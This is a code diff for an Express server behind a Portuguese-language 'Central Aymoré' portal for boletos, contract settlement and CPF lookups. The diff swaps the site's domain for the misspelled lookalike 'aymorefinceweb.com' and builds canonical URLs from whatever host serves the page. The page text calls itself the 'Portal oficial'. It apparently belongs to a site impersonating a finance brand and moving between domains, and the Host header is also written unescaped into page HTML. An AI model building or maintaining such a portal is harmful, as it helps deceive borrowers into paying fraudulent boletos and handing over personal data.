@@ -236,21 +236,6 @@ async function startServer() {
     }
   });
 
-  // Redirect www.centralwebaymore.com to non-www and strip trailing slashes (301 Permanent Redirect)
-  app.use((req, res, next) => {
-    const host = req.headers.host || "";
-    if (host.startsWith("www.")) {
-      const nonWwwHost = host.replace(/^www\./, "");
-      return res.redirect(301, `https://${nonWwwHost}${req.originalUrl}`);
-    }
-    if (req.path.length > 1 && req.path.endsWith("/")) {
-      const query = req.url.slice(req.path.length);
-      const safePath = req.path.slice(0, -1);
-      return res.redirect(301, safePath + query);
-    }
-    next();
-  });
-
   // Explicit SEO routes for sitemap.xml and robots.txt
   app.get("/sitemap.xml", (req, res) => {
     res.setHeader("Content-Type", "application/xml; charset=utf-8");
@@ -275,11 +260,15 @@ async function startServer() {
     if (fs.existsSync(distRobots)) {
       return res.sendFile(distRobots);
     }
-    return res.status(404).send("User-agent: *\nAllow: /\nSitemap: https://centralwebaymore.com/sitemap.xml");
+    return res.status(404).send("User-agent: *\nAllow: /\nSitemap: https://aymorefinceweb.com/sitemap.xml");
   });
 
   const seoRouteMap: Record<string, { title: string; desc: string }> = {
     "/": {
+      title: "Central Aymoré | 2ª Via de Boleto, Quitação e Autoatendimento",
+      desc: "Portal oficial de autoatendimento Central Aymoré. Emita 2ª via de boleto, solicite quitação de contrato com desconto e consulte seus financiamentos pelo CPF."
+    },
+    "/vite": {
       title: "Central Aymoré | 2ª Via de Boleto, Quitação e Autoatendimento",
       desc: "Portal oficial de autoatendimento Central Aymoré. Emita 2ª via de boleto, solicite quitação de contrato com desconto e consulte seus financiamentos pelo CPF."
     },
@@ -369,7 +358,9 @@ async function startServer() {
         let html = fs.readFileSync(htmlPath, "utf-8");
         const cleanPath = req.path === "/" ? "/" : req.path.replace(/\/+$/, "");
         const seo = seoRouteMap[cleanPath] || seoRouteMap["/"];
-        const canonicalUrl = `https://centralwebaymore.com${cleanPath}`;
+        const host = req.headers.host || "aymorefinceweb.com";
+        const proto = (req.headers["x-forwarded-proto"] as string) || "https";
+        const canonicalUrl = `${proto}://${host}${cleanPath}`;
 
         html = html.replace(/<title>.*?<\/title>/gi, `<title>${seo.title}</title>`);
         html = html.replace(/<meta name="description" content=".*?"\s*\/?>/gi, `<meta name="description" content="${seo.desc}" />`);
